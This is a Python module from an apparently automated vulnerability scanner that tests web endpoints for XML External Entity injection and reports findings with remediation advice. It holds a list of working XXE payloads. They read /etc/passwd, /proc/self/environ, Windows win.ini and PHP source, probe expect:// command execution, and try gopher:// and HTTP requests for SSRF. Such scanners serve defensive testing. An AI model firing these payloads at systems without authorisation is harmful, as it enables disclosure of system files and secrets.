"""SentinelX module [20]: XML External Entity (XXE) injection.

Real implementation: content-type switching (form -> XML), external entity
probes with marker-based detection, error-based detection via parser error
signatures. Safe: entities reference local marker files, no OOB exfiltration.
"""

from __future__ import annotations

import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


XXE_PAYLOADS = [
    # classic file disclosure
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
     re.compile(r"root:x:0:0:"), "file:///etc/passwd content reflected"),
    # parameter entity (bypass naive filters)
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % a SYSTEM "file:///etc/passwd"> %a;]><r>test</r>',
     re.compile(r"root:x:0:0:"), "parameter entity file disclosure"),
    # error-based: invalid entity triggers parser error with system id
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///nonexistent-sx-12345">]><r>&xxe;</r>',
     re.compile(r"nonexistent-sx-12345|failed to load external entity|parser error", re.I),
     "external entity resolution error"),
    # billion laughs (DoS probe - safe mode: small, just detection)
    ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lollollollollollollollol">]><r>&lol;</r>',
     re.compile(r"lollollol"), "entity expansion reflected"),
    # --- TECHNIQUE: Windows file disclosure ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><r>&xxe;</r>',
     re.compile(r"\[fonts\]|\[extensions\]", re.I), "Windows win.ini disclosure"),
    # --- TECHNIQUE: PHP filter wrapper (source disclosure) ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><r>&xxe;</r>',
     re.compile(r"PD9waH|base64", re.I), "php://filter wrapper probe"),
    # --- TECHNIQUE: XInclude ---
    ('<?xml version="1.0"?><r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></r>',
     re.compile(r"root:x:0:0:"), "XInclude file disclosure"),
    # --- TECHNIQUE: SVG-based XXE ---
    ('<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>',
     re.compile(r"root:x:0:0:"), "SVG XXE file disclosure"),
    # --- TECHNIQUE: external DTD ---
    ('<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://127.0.0.1:9/evil.dtd"><r>test</r>',
     re.compile(r"evil\.dtd|failed to load|external subset", re.I), "external DTD resolution"),
    # --- TECHNIQUE: parameter entity with internal subset bypass ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p1 "<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>"> %p1;]><r>&xxe;</r>',
     re.compile(r"root:x:0:0:"), "nested parameter entity disclosure"),
    # --- TECHNIQUE: UTF-7 encoded XXE ---
    ('<?xml version="1.0" encoding="UTF-7"?><!DOCTYPE r [+ADwAIQ-DOCTYPE r [+ADwAIQ-ENTITY xxe SYSTEM "+ACI-file:///etc/passwd+ACIAPgBdAPg-+ADw-r+AD4-+ACY-xxe+ADsAPgAv-r+AD4-',
     re.compile(r"root:x:0:0:"), "UTF-7 encoded XXE"),
    # --- TECHNIQUE: expect:// (RCE-adjacent, safe probe) ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>',
     re.compile(r"uid=|gid=", re.I), "expect:// command execution probe"),
    # --- TECHNIQUE: jar:// protocol ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "jar:file:///tmp/x.jar!/f">]><r>&xxe;</r>',
     re.compile(r"jar:|failed to load external entity", re.I), "jar:// protocol probe"),
    # --- TECHNIQUE: gopher:// (SSRF-adjacent) ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "gopher://127.0.0.1:9/_">]><r>&xxe;</r>',
     re.compile(r"gopher|connection refused|failed to load", re.I), "gopher:// SSRF probe"),
    # --- TECHNIQUE: quadratic blowup (DoS detection, small) ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "1234567890">]><r>&a;&a;&a;&a;&a;</r>',
     re.compile(r"12345678901234567890"), "entity expansion (quadratic)"),
    # --- TECHNIQUE: external entity in attribute ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><r a="&xxe;">x</r>',
     re.compile(r"[a-z0-9-]{2,}", re.I), "entity in attribute value"),
    # --- TECHNIQUE: DTD with encoding override ---
    ('<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>',
     re.compile(r"root:x:0:0:"), "encoding-override XXE"),
    # --- TECHNIQUE: file disclosure via /proc ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><r>&xxe;</r>',
     re.compile(r"PATH=|HOME=", re.I), "/proc/self/environ disclosure"),
    # --- TECHNIQUE: blind XXE error channel ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///sx-blind-98765">]><r>&xxe;</r>',
     re.compile(r"sx-blind-98765|could not|failed to", re.I), "blind XXE error channel"),
    # --- TECHNIQUE: SOAP-style XXE ---
    ('<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r></soap:Body></soap:Envelope>',
     re.compile(r"root:x:0:0:"), "SOAP envelope XXE"),
    # --- TECHNIQUE: RSS/Atom XXE ---
    ('<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><rss><channel><title>&xxe;</title></channel></rss>',
     re.compile(r"root:x:0:0:"), "RSS feed XXE"),
    # --- TECHNIQUE: Office document XXE (OOXML) ---
    ('<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><w:document>&xxe;</w:document>',
     re.compile(r"root:x:0:0:"), "OOXML document XXE"),
    # --- TECHNIQUE: DTD entity in notation ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!NOTATION n SYSTEM "file:///etc/passwd"><!ENTITY xxe SYSTEM "x" NDATA n>]><r>&xxe;</r>',
     re.compile(r"notation|ndata|failed to load", re.I), "notation entity probe"),
    # --- TECHNIQUE: external entity via HTTP ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1:9/xxe">]><r>&xxe;</r>',
     re.compile(r"connection refused|failed to load external entity", re.I), "HTTP external entity"),
    # --- TECHNIQUE: file disclosure /etc/hosts ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><r>&xxe;</r>',
     re.compile(r"localhost|127\.0\.0\.1", re.I), "/etc/hosts disclosure"),
    # --- TECHNIQUE: CDATA-wrapped entity ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r><![CDATA[&xxe;]]></r>',
     re.compile(r"root:x:0:0:"), "CDATA entity probe"),
    # --- TECHNIQUE: double XXE (entity in entity) ---
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "xx"><!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&a;&xxe;</r>',
     re.compile(r"root:x:0:0:"), "chained entity disclosure"),
]

ERROR_SIGS = [
    (re.compile(r"xml.*parse.*error|parser error|malformed xml", re.I), "XML parser error - XML accepted"),
    (re.compile(r"doctype.*not allowed|dtd.*prohibited|external.*entit", re.I), "DTD/entity handling detected"),
]

REMEDIATION_XXE = (
    "Disable DTDs and external entity resolution in XML parsers. Use "
    "defusedxml (Python), or set parser features to disallow DOCTYPE. "
    "Prefer JSON over XML for new APIs."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    headers = {"User-Agent": config.user_agent,
               "Content-Type": "application/xml"}

    # signal 1: does the endpoint accept XML? (content-type switching)
    # (No params gate: XXE is about the body, not form fields. The
    # xml_accepted check below is the real gate.)
    probe_xml = '<?xml version="1.0"?><r><test>sx</test></r>'
    p = dict(params)
    # send as raw XML body regardless of original method params
    resp = await client.post(url, data=probe_xml.encode(), headers=headers)
    xml_accepted = False
    if resp and resp.status_code < 400:
        for rx, _ in ERROR_SIGS:
            if rx.search(resp.text):
                xml_accepted = True
                break
        # also: 200 with no error on well-formed XML suggests acceptance
        if resp.status_code == 200:
            xml_accepted = True

    if not xml_accepted:
        return findings

    # signal 2: XXE payloads with marker/error confirmation (2 signals required)
    for payload, marker_rx, label in XXE_PAYLOADS:
        r2 = await client.post(url, data=payload.encode(), headers=headers)
        if not r2:
            continue
        m = marker_rx.search(r2.text)
        if m:
            # confirm: resend to rule out coincidence
            r3 = await client.post(url, data=payload.encode(), headers=headers)
            if r3 and marker_rx.search(r3.text):
                ev = Evidence(
                    request_raw=raw_request("POST", url, headers, payload.encode()[:500]),
                    response_raw=raw_response(r2.status_code, dict(r2.headers), r2.content),
                    proof=f"XXE confirmed (2/2): {label}; endpoint accepts XML content-type",
                )
                findings.append(Finding(
                    type="XML External Entity", subtype="xxe",
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
                    confidence=0.90, url=url, method="POST", param="",
                    payload=payload[:120], evidence=ev, cwe="CWE-611",
                    owasp="A05:2021 – Security Misconfiguration",
                    remediation=REMEDIATION_XXE,
                    references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                ))
                break
    return findings
